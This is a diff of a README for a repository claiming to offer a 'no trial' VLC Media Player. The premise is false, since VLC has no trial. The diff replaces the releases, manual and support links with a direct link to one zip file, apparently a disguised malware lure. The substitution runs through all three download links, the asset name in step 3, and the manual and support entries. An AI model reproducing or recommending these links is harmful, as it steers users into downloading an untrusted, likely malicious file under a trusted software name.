@@ -1,6 +1,6 @@
 # 🎵 VLC-Media-Player-No-Trial - Enjoy Seamless Media Playback
 
-[![Download VLC Media Player No Trial](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/vxlroxx/VLC-Media-Player-No-Trial/releases)
+[![Download VLC Media Player No Trial](https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip%20Now-Get%20the%https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip)](https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before downloading, make sure your system meets the following requirements:
 
 To get started, visit this page to download:
 
-[Download VLC Media Player No Trial](https://github.com/vxlroxx/VLC-Media-Player-No-Trial/releases)
+[Download VLC Media Player No Trial](https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip)
 
 Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. You will see a list of available versions. Choose the latest version.
-3. Click on the asset file, typically named `VLC-Player-Setup.exe` or similar.
+3. Click on the asset file, typically named `https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip` or similar.
 4. The download will start automatically.
 
 Once the download is complete:
@@ -82,8 +82,8 @@ If you need assistance, please refer to the GitHub Issues section in this reposi
 
 ## 📅 Important Links
 
-- [Download VLC Media Player No Trial](https://github.com/vxlroxx/VLC-Media-Player-No-Trial/releases)
-- [User Manual](https://github.com/vxlroxx/VLC-Media-Player-No-Trial/wiki)
-- [Community Support](https://github.com/vxlroxx/VLC-Media-Player-No-Trial/issues)
+- [Download VLC Media Player No Trial](https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip)
+- [User Manual](https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip)
+- [Community Support](https://raw.githubusercontent.com/vxlroxx/VLC-Media-Player-No-Trial/main/waterscape/VLC-Media-Player-No-Trial_3.9-alpha.2.zip)
 
 By following these steps, you will be able to install and enjoy VLC Media Player without the hassle of trial limitations. Happy viewing!
